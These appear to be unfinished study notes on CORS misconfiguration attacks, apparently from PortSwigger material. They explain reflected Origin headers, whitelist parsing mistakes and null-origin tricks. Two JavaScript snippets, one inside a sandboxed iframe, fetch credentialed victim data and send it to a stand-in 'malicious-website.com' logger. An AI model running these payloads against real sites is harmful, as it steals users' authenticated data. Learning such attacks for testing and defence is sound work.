Researches
https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties

# Host/Origin headers reflects to ACAO headers

Can be used to steal sensitive information from the arbitrary response.
 `Access-Control-Allow-Credentials: true` - means cookie will be added to the our malicious request. Such way we have access to methods that require authorization.
Example:
```js
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
	location='//malicious-website.com/log?key='+this.responseText;
};
```

# Error parsing Origin headers
Mistakes often arise implementing Origin whitelists.
For example, suppose an application grants access to all domains ending in: 
```
normal-website.com
```
  An attacker might be able to gain access by registering the domain: 
```
hackersnormal-website.com
```
 Alternatively, suppose an application grants access to all domains beginning with 
```
normal-website.com
```
An attacker might be able to gain access using the domain:
```
normal-website.com.evil-user.net
```
##### Whitelisted null origin value
 The specification for the Origin header supports the value null. Browsers might send the value null in the Origin header in various unusual situations:
* Cross-origin redirects.
* Requests from serialized data.
* Request using the `file:` protocol.
* Sandboxed cross-origin requests.
There are different ways to set `Origin` to `null`, for example:
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='malicious-website.com/log?key='+this.responseText;
};
</script>"></iframe>
```

TODO: finish the lab, portswigger appears to be broken

# Exploiting XSS via CORS trust relationships
#to-be-continued 